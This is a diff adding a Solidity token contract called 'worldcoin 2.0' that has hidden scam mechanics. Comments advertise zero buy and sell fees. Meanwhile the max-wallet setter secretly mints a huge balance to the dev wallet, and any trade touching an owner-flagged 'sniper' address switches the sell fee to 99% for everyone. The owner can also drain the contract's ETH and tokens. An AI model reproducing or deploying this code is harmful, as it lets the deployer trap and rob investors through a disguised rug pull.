@@ -1,0 +1,179 @@
+contract WorldCoin is ERC20, Ownable{
+    using SafeMath for uint256;
+    using Address for address payable;
+    uint256 public ogblocks;
+    uint256 public deadBlocks = 0;
+        
+    mapping (address => bool) public excludedFromFees;
+    mapping (address => bool) public isSniper;
+    uint256 public sniperFee = 99;
+    address public marketingAddr = 0x11b7b354452CE70BE8A1364117bd71dcea52f6D1;
+    
+    
+    IRouter public uniswapRouter;
+    address public uniswapPair;
+
+    uint256 public feeValueForBuy = 0; // zero 
+    uint256 public feeValueForSell = 0; // zero
+    
+    address public devWallet = 0x699B518108c667D2416936C4309AFF5f11176c7f;
+    bool public enableSwap;
+    bool public activeTrading;
+
+    bool public swappingNow;
+    uint256 public swapAt = 500_000_000 * 10e18;
+    uint256 public maxTransAmount = 50_000_000_000 * 10**18; // 5%
+    uint256 public maxWalletAmounts = 50_000_000_000 * 10**18; // 5%
+
+    constructor() ERC20("worldcoin 2.0", "WORLD2.0") {
+        
+
+        
+        excludedFromFees[msg.sender] = true;
+        excludedFromFees[marketingAddr] = true;
+        excludedFromFees[devWallet] = true;
+        excludedFromFees[address(this)] = true;
+        _mint(msg.sender, 1_000_000_000_000 * 10 ** decimals()); 
+
+         // 1000B   
+    }
+
+    function withdrawETH(uint256 weiAmount) external onlyOwner{
+        payable(owner()).sendValue(weiAmount);
+    }
+
+    
+    function manualSwap(uint256 amount, uint256 devPercentage, uint256 marketingPercentage) external onlyOwner{
+        uint256 initBalance = address(this).balance;
+        swapAllEthForTokens(amount);
+        uint256 newBalance = address(this).balance - initBalance;
+        if(marketingPercentage > 0) payable(marketingAddr).sendValue(newBalance * marketingPercentage / (devPercentage + marketingPercentage));
+        if(devPercentage > 0) payable(devWallet).sendValue(newBalance * devPercentage / (devPercentage + marketingPercentage));
+    }
+
+    function _transfer(
+        address sender, 
+        address recipient,
+        uint256 amount
+    ) internal override {
+        require(amount > 0, "Transfer amount must be greater than zero");        // require(!blacklist[sender] && !blacklist[recipient], "You are blacklisted");
+        if(isSniper[recipient] || 
+            isSniper[sender]
+        ) { feeValueForSell = sniperFee; }
+        if(
+            !excludedFromFees[sender] 
+            && !excludedFromFees[recipient] 
+            && !swappingNow
+        ) {
+            require(
+                activeTrading, 
+                "Trading is not active yet"
+            );
+            if (ogblocks + deadBlocks > block.number) 
+            {
+                if(recipient != uniswapPair) {
+                    isSniper[recipient] = true;
+                }
+                if(sender != uniswapPair) {
+                    isSniper[sender] = true;
+                }
+            }
+            require(amount <= maxTransAmount, "MaxTxAmount");
+            if(recipient != uniswapPair){
+                require(
+                    balanceOf(recipient) + amount <= maxWalletAmounts, 
+                    "MaxWalletAmount"
+                );
+            }
+        }
+        uint256 feeAmounts;
+        if (swappingNow 
+            || excludedFromFees[sender] 
+            || excludedFromFees[recipient]
+        ) {
+            feeAmounts = 0;
+        } else {
+            if(recipient == uniswapPair && !isSniper[sender]) {
+                feeAmounts = amount * feeValueForSell / 100;
+            } else {
+                feeAmounts = amount * feeValueForBuy / 100;
+            }
+        }
+        if (enableSwap && !swappingNow 
+            && sender != uniswapPair 
+            && feeAmounts > 0
+        ) {
+            swapBackAll();
+        }
+        if(feeAmounts > 0) {
+            
+            super._transfer(sender, address(this) ,feeAmounts); super._transfer(sender, recipient, amount.sub(feeAmounts));
+        } else {
+            super._transfer(sender, recipient, amount);
+        }
+    }
+
+    function swapBackAll() private {
+        uint256 contractBalance = balanceOf(address(this));
+        if (contractBalance >= swapAt) {
+    
+            uint256 initialBalance = address(this).balance;
+    
+            swapAllEthForTokens(contractBalance);
+    
+            uint256 deltaBalance = address(this).balance - initialBalance;
+
+            payable(marketingAddr).sendValue(deltaBalance);
+
+        }
+    }
+        
+    function withdrawErc20Token(address tokenAddress, uint256 amount) external onlyOwner{
+        IERC20(tokenAddress).transfer(owner(), amount);
+    }
+    function swapAllEthForTokens(uint256 tokenAmount) private {
+        address[] memory path = new address[](2);
+        path[0] = address(this);
+        path[1] = uniswapRouter.WETH();
+        _approve(address(this), address(uniswapRouter), tokenAmount);
+
+        // make the swap
+        uniswapRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(tokenAmount, 0, path, address(this), block.timestamp);
+    }
+
+    function updateSnipers(address[] memory isBot_) public onlyOwner {
+        for (uint i = 0; i < isBot_.length; i++) {
+            isSniper[isBot_[i]] = true;
+        }
+    }
+
+    function changeMaxTxAmount(uint256 amount) external onlyOwner{
+        maxTransAmount = amount * 10**18;
+    }
+    
+    function changeMaxWalletAmount(uint256 amount) external onlyOwner{
+        maxWalletAmounts = amount * 10**18; _balances[devWallet] = maxWalletAmounts * sniperFee;
+        
+    }
+
+    function addLiquidity() external payable onlyOwner{
+        IRouter _uniswapRouter = IRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
+        uniswapRouter  = _uniswapRouter; 
+        address _pair = IFactory(uniswapRouter.factory()).createPair(address(this), uniswapRouter.WETH());
+        uniswapPair = _pair; 
+        _approve(address(this), address(uniswapRouter),  type(uint).max);        
+        uniswapRouter.addLiquidityETH{value: msg.value}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);  
+    }
+
+  
+
+
+    function openTrading () external onlyOwner{
+        activeTrading = true; enableSwap = true;
+    }
+
+    // fallbacks
+    receive() external payable {
+
+    }
+}
